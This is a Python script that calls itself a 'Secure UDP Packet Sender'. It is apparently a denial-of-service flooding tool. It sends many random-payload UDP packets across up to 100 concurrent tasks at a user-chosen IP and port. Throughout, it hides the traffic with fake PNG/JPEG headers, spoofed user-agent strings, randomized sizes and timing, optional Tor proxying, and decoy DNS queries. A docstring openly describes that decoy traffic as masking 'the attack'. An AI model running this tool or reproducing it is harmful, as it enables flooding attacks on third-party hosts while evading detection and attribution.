#!/usr/bin/env python3
"""
Secure UDP Packet Sender with Encryption and Obfuscation
Features: AES-256 encryption, packet randomization, TOR/Proxy support, 
          traffic pattern obfuscation, and multi-protocol capabilities
"""

import socket
import os
import asyncio
import argparse
import random
import time
import hashlib
import struct
import threading
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64
import zlib

# Configuration
MAX_PACKET_SIZE = 65507
ENCRYPTION_KEY = hashlib.sha256(b"dynamic_seed_change_this").digest()
IV_SIZE = 16
PROXY_LIST = [
    {"host": "127.0.0.1", "port": 9050, "type": "socks5"},  # TOR default
    {"host": "127.0.0.1", "port": 9150, "type": "socks5"},  # TOR browser
]
FAKE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

class SecureUDPClient:
    def __init__(self, use_encryption=True, use_compression=False, use_proxy=False):
        self.use_encryption = use_encryption
        self.use_compression = use_compression
        self.use_proxy = use_proxy
        self.current_proxy = None
        self.session_key = self.generate_session_key()
        self.packet_counter = 0
        
    def generate_session_key(self):
        """Generate a unique session key for each run"""
        seed = os.urandom(32) + str(time.time()).encode()
        return hashlib.sha256(seed).digest()
    
    def encrypt_data(self, data):
        """Encrypt data using AES-256-CBC"""
        if not self.use_encryption:
            return data
            
        iv = os.urandom(IV_SIZE)
        cipher = Cipher(
            algorithms.AES(self.session_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        
        # Pad data to AES block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # Encrypt
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        
        return iv + encrypted
    
    def decrypt_data(self, encrypted_data):
        """Decrypt AES-256-CBC encrypted data"""
        iv = encrypted_data[:IV_SIZE]
        ciphertext = encrypted_data[IV_SIZE:]
        
        cipher = Cipher(
            algorithms.AES(self.session_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Unpad
        unpadder = padding.PKCS7(128).unpadder()
        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
        
        return decrypted
    
    def compress_data(self, data):
        """Compress data using zlib"""
        if not self.use_compression:
            return data
        return zlib.compress(data)
    
    def decompress_data(self, data):
        """Decompress zlib compressed data"""
        if not self.use_compression:
            return data
        return zlib.decompress(data)
    
    def create_stealth_packet(self, payload, packet_type="data"):
        """Create a stealth packet with headers to mimic legitimate traffic"""
        # Packet structure: [MAGIC][TYPE][SIZE][COUNTER][TIMESTAMP][PAYLOAD][CHECKSUM]
        magic = b"\x89PNG\r\n\x1a\n" if random.random() > 0.5 else b"\xff\xd8\xff\xe0"  # PNG or JPEG header
        ptype = packet_type.encode('utf-8').ljust(4, b'\x00')
        size = struct.pack('!I', len(payload))
        counter = struct.pack('!Q', self.packet_counter)
        timestamp = struct.pack('!d', time.time())
        
        # Build packet
        packet = magic + ptype + size + counter + timestamp + payload
        
        # Add checksum
        checksum = hashlib.sha256(packet).digest()[:4]
        packet += checksum
        
        self.packet_counter += 1
        return packet
    
    def randomize_packet_size(self, base_size):
        """Randomize packet size to avoid detection"""
        variation = random.randint(-100, 100)
        return max(1, min(MAX_PACKET_SIZE, base_size + variation))
    
    def get_random_delay(self):
        """Get random delay between packets to simulate human behavior"""
        return random.uniform(0.001, 0.1)

async def create_secure_socket(use_proxy=False):
    """Create a socket with optional proxy support"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Enable packet prioritization (if available)
    try:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # Low delay
    except:
        pass
    
    if use_proxy:
        # For SOCKS5 proxy support (requires additional library)
        # You can install: pip install PySocks
        try:
            import socks
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        except ImportError:
            print("PySocks not installed. Running without proxy.")
    
    return sock

async def send_stealth_packet(client, sock, ip, port, data, thread_id):
    """Send a stealth packet with obfuscation"""
    try:
        # Process data through encryption/compression pipeline
        if client.use_compression:
            data = client.compress_data(data)
        
        if client.use_encryption:
            data = client.encrypt_data(data)
        
        # Create stealth packet
        stealth_data = client.create_stealth_packet(data)
        
        # Randomize size if needed
        if len(stealth_data) > MAX_PACKET_SIZE:
            stealth_data = stealth_data[:MAX_PACKET_SIZE]
        
        # Send packet
        sock.sendto(stealth_data, (ip, port))
        
        # Random delay
        await asyncio.sleep(client.get_random_delay())
        
        return True
        
    except Exception as e:
        print(f"Thread {thread_id}: Error - {str(e)[:50]}")
        return False

async def send_packets_with_obfuscation(ip, port, packet_size, num_packets, thread_id, 
                                        use_encryption=True, use_compression=False, 
                                        use_proxy=False, variable_rate=False):
    """Send packets with advanced obfuscation techniques"""
    client = SecureUDPClient(use_encryption=use_encryption, 
                            use_compression=use_compression, 
                            use_proxy=use_proxy)
    
    sock = await create_secure_socket(use_proxy)
    
    sent_count = 0
    error_count = 0
    
    for i in range(num_packets):
        try:
            # Generate random data with some patterns to avoid entropy detection
            if random.random() > 0.7:
                # Generate structured data (mimics legitimate traffic)
                fake_header = random.choice(FAKE_USER_AGENTS).encode()
                payload = fake_header + os.urandom(packet_size - len(fake_header))
            else:
                # Generate random data
                payload = os.urandom(packet_size)
            
            # Randomize packet size
            current_size = client.randomize_packet_size(packet_size)
            payload = payload[:current_size]
            
            # Send with stealth
            success = await send_stealth_packet(client, sock, ip, port, payload, thread_id)
            
            if success:
                sent_count += 1
            else:
                error_count += 1
            
            # Variable rate to avoid pattern detection
            if variable_rate:
                if i % random.randint(50, 200) == 0:
                    await asyncio.sleep(random.uniform(0.1, 1.0))
            
            # Progress reporting with obfuscated output
            if i % random.randint(20, 100) == 0:
                obfuscated_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                print(f"[{thread_id:02d}] Progress: {i}/{num_packets} | "
                      f"Target: {obfuscated_ip}:{port} | "
                      f"Errors: {error_count}", end='\r')
                
        except Exception as e:
            error_count += 1
            if error_count % 10 == 0:
                print(f"Thread {thread_id}: Multiple errors detected")
    
    sock.close()
    
    # Generate session report
    report = {
        'thread_id': thread_id,
        'sent': sent_count,
        'errors': error_count,
        'session_key': base64.b64encode(client.session_key).decode()[:16] + "...",
        'timestamp': time.time()
    }
    
    return report

async def dns_lookup_obfuscation(target_ip):
    """Perform DNS lookups to create legitimate traffic patterns"""
    import dns.resolver
    
    domains = ["google.com", "cloudflare.com", "github.com", "wikipedia.org"]
    
    for domain in random.sample(domains, 2):
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1']
            answers = resolver.resolve(domain, 'A')
            for _ in answers:
                pass  # Just trigger the lookup
            await asyncio.sleep(random.uniform(0.5, 2))
        except:
            pass

async def background_traffic_generator(duration=30):
    """Generate background traffic to mask the attack"""
    print("Starting background traffic generation...")
    
    tasks = []
    for i in range(3):
        task = asyncio.create_task(
            generate_fake_traffic(f"BG-{i+1}")
        )
        tasks.append(task)
    
    await asyncio.sleep(duration)
    
    for task in tasks:
        task.cancel()
    
    print("Background traffic stopped")

async def generate_fake_traffic(name):
    """Generate fake legitimate traffic patterns"""
    fake_targets = [
        ("8.8.8.8", 53),  # Google DNS
        ("1.1.1.1", 53),  # Cloudflare DNS
        ("208.67.222.222", 53),  # OpenDNS
    ]
    
    while True:
        try:
            target = random.choice(fake_targets)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Create fake DNS query
            query_id = random.randint(0, 65535)
            flags = 0x0100  # Standard query
            questions = 1
            query = struct.pack('!HHHHHH', query_id, flags, questions, 0, 0, 0)
            
            # Add domain (google.com)
            domain = b"\x06google\x03com\x00"
            query += domain
            
            # Query type A (1), class IN (1)
            query += struct.pack('!HH', 1, 1)
            
            sock.sendto(query, target)
            sock.close()
            
            await asyncio.sleep(random.uniform(0.5, 5))
            
        except:
            await asyncio.sleep(1)

async def main(ip, port, packet_size, num_packets, num_threads, 
               use_encryption=True, use_compression=False, 
               use_proxy=False, variable_rate=True, 
               background_traffic=False):
    """Main function with enhanced features"""
    
    print(f"""
╔══════════════════════════════════════════════╗
║       SECURE UDP PACKET SENDER v2.0          ║
╠══════════════════════════════════════════════╣
║ Target: {ip}:{port:<27} ║
║ Packet Size: {packet_size:<6} Threads: {num_threads:<6} ║
║ Encryption: {'ON' if use_encryption else 'OFF':<8} Compression: {'ON' if use_compression else 'OFF':<6} ║
║ Proxy: {'ON' if use_proxy else 'OFF':<11} Variable Rate: {'ON' if variable_rate else 'OFF':<6} ║
╚══════════════════════════════════════════════╝
    """)
    
    packets_per_thread = num_packets // num_threads
    
    # Start background traffic if enabled
    bg_task = None
    if background_traffic:
        bg_task = asyncio.create_task(background_traffic_generator())
    
    # Perform DNS obfuscation
    await dns_lookup_obfuscation(ip)
    
    # Create tasks for packet sending
    tasks = []
    for i in range(num_threads):
        task = send_packets_with_obfuscation(
            ip, port, packet_size, packets_per_thread, i + 1,
            use_encryption, use_compression, use_proxy, variable_rate
        )
        tasks.append(task)
    
    # Execute all tasks
    results = await asyncio.gather(*tasks)
    
    # Cancel background traffic if running
    if bg_task:
        bg_task.cancel()
    
    # Print summary report
    print("\n" + "="*60)
    print("SESSION SUMMARY")
    print("="*60)
    
    total_sent = sum(r['sent'] for r in results)
    total_errors = sum(r['errors'] for r in results)
    
    for result in results:
        print(f"Thread {result['thread_id']:02d}: "
              f"{result['sent']} packets | "
              f"{result['errors']} errors | "
              f"Key: {result['session_key']}")
    
    print("-"*60)
    print(f"TOTAL: {total_sent} packets sent | {total_errors} errors")
    print(f"Success Rate: {(total_sent/(total_sent+total_errors)*100):.1f}%")
    print(f"Session completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*60)

def validate_arguments(args):
    """Validate and sanitize input arguments"""
    # Validate IP address
    try:
        socket.inet_aton(args.ip)
    except socket.error:
        # Try DNS resolution
        try:
            socket.gethostbyname(args.ip)
        except:
            raise ValueError(f"Invalid IP address or hostname: {args.ip}")
    
    # Validate port
    if args.port < 1 or args.port > 65535:
        raise ValueError(f"Port must be between 1 and 65535")
    
    # Validate packet size
    if args.packet_size < 1 or args.packet_size > MAX_PACKET_SIZE:
        raise ValueError(f"Packet size must be between 1 and {MAX_PACKET_SIZE}")
    
    # Validate number of packets
    if args.num_packets < 1:
        raise ValueError("Number of packets must be positive")
    
    # Validate threads
    if args.num_threads < 1 or args.num_threads > 100:
        raise ValueError("Number of threads must be between 1 and 100")
    
    return args

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Secure UDP Packet Sender with Encryption and Obfuscation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.100 80 1024 10000 10
  %(prog)s example.com 443 512 5000 5 --encrypt --compress --proxy
  %(prog)s 10.0.0.1 53 256 20000 20 --variable-rate --background
        
Advanced Usage:
  Use with TOR: Install tor service and use --proxy flag
  For maximum stealth: Use all flags together
        """
    )
    
    # Required arguments
    parser.add_argument("ip", help="Target IP address or hostname")
    parser.add_argument("port", type=int, help="Target port (1-65535)")
    parser.add_argument("packet_size", type=int, 
                       help=f"Packet size in bytes (1-{MAX_PACKET_SIZE})")
    parser.add_argument("num_packets", type=int, 
                       help="Total number of packets to send")
    parser.add_argument("num_threads", type=int, 
                       help="Number of concurrent threads (1-100)")
    
    # Optional security features
    parser.add_argument("--encrypt", action="store_true",
                       help="Enable AES-256 encryption")
    parser.add_argument("--compress", action="store_true",
                       help="Enable data compression")
    parser.add_argument("--proxy", action="store_true",
                       help="Use proxy/TOR for routing (requires proxy setup)")
    parser.add_argument("--variable-rate", action="store_true",
                       help="Use variable sending rate to avoid detection")
    parser.add_argument("--background", action="store_true",
                       help="Generate background traffic for obfuscation")
    
    # Performance options
    parser.add_argument("--max-rate", type=int, default=0,
                       help="Maximum packets per second (0 for unlimited)")
    
    args = parser.parse_args()
    
    try:
        # Validate arguments
        args = validate_arguments(args)
        
        # Run main function
        asyncio.run(
            main(
                args.ip,
                args.port,
                args.packet_size,
                args.num_packets,
                args.num_threads,
                use_encryption=args.encrypt,
                use_compression=args.compress,
                use_proxy=args.proxy,
                variable_rate=args.variable_rate,
                background_traffic=args.background
            )
        )
        
    except KeyboardInterrupt:
        print("\n\n[!] Process interrupted by user")
        print("[*] Cleaning up resources...")
        
    except Exception as e:
        print(f"\n[ERROR] {e}")
        
    finally:
        print("\n[*] Secure UDP Sender terminated")
